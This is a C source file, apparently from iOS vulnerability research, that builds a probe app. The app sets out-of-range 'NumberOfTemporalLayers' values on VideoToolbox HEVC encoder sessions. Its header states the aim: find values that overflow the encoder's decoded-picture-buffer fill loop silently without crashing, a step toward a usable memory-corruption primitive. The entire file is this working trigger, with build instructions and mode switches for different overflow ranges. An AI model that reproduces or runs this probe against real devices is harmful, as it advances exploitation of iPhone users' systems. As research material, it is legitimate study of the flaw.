/*
 * ave_graduated_probe.c — Graduated NTL Overflow Probe
 *
 * Tests various NumberOfTemporalLayers values to find the sweet spot
 * where the DPB fill loop overflows silently without crashing.
 *
 * SKVLENT found: NTL 9-63 overflows within mapped memory (silent).
 * NTL >= 16463 hits unmapped page (crash).
 *
 * This probe tests values in that range and monitors for side effects.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface \
 *     -o ave_graduated_probe ave_graduated_probe.c -Wno-deprecated-declarations
 *
 * Deployed as: AVEGrad.app (com.research.avegrad)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef uint32_t IOSurfaceID;
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

static void set_int_prop(VTCompressionSessionRef s, const char *key, int val) {
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &val);
    VTSessionSetProperty(s, CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), n);
    CFRelease(n);
}

struct cb_ctx { int count; FILE *out; };

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    struct cb_ctx *ctx = (struct cb_ctx *)ref;
    ctx->count++;
    size_t sz = 0;
    if (sb) {
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
        if (bb) sz = CMBlockBufferGetDataLength(bb);
    }
    fprintf(ctx->out, "  [CB] #%d st=%d sz=%zu\n", ctx->count, (int)st, sz);
    fflush(ctx->out);
}

static int test_ntl(int ntl, int encode_frames) {
    p("\n=== NTL=%d (encode %d frames) ===\n", ntl, encode_frames);

    CFMutableDictionaryRef srcAttrs = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef ioSurfProps = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferIOSurfacePropertiesKey, ioSurfProps);
    CFRelease(ioSurfProps);
    int fmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fmtNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(srcAttrs, kCVPixelBufferPixelFormatTypeKey, fmtNum);
    CFRelease(fmtNum);

    struct cb_ctx ctx = { .count = 0, .out = out };

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, srcAttrs, NULL, encode_cb, &ctx, &session);
    CFRelease(srcAttrs);

    if (st != noErr || !session) { p("  Create failed: %d\n", (int)st); return -1; }

    set_int_prop(session, "EncoderUsage", 1);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    set_int_prop(session, "NumberOfTemporalLayers", ntl);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    p("  Prepare: %d\n", (int)st);
    if (st != noErr) { VTCompressionSessionInvalidate(session); CFRelease(session); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(session);
    if (!pool) { p("  No pool\n"); VTCompressionSessionInvalidate(session); CFRelease(session); return -2; }

    for (int i = 0; i < encode_frames; i++) {
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;

        IOSurfaceRef surf = CVPixelBufferGetIOSurface(pb);
        if (surf && i == 0) p("  IOS id=%u alloc=%zu\n", IOSurfaceGetID(surf), IOSurfaceGetAllocSize(surf));

        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, 0x41 + (i & 0xF), CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);
        VTEncodeInfoFlags flags = 0;
        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, &flags);
        p("  Frame %d: %d\n", i, (int)st);
        CVPixelBufferRelease(pb);
        if (st != noErr) break;
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    p("  Callbacks: %d\n", ctx.count);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    p("  Done (no crash)\n");
    return 0;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_graduated_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Graduated NTL Probe ===\n");
    p("Mode: %s\n", mode);
    p("PID: %d\n", getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n\n", buf);

    if (strcmp(mode, "safe") == 0) { test_ntl(2, 3); }
    else if (strcmp(mode, "low") == 0) { test_ntl(9,1); test_ntl(16,1); test_ntl(32,1); test_ntl(48,1); test_ntl(63,1); }
    else if (strcmp(mode, "mid") == 0) { test_ntl(64,1); test_ntl(128,1); test_ntl(256,1); test_ntl(512,1); }
    else if (strcmp(mode, "high") == 0) { test_ntl(1000, 1); }
    else if (strcmp(mode, "single9") == 0) { test_ntl(9, 5); }
    else if (strcmp(mode, "single32") == 0) { test_ntl(32, 5); }
    else if (strcmp(mode, "single63") == 0) { test_ntl(63, 5); }
    else { p("Modes: safe low mid high single9 single32 single63\n"); }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
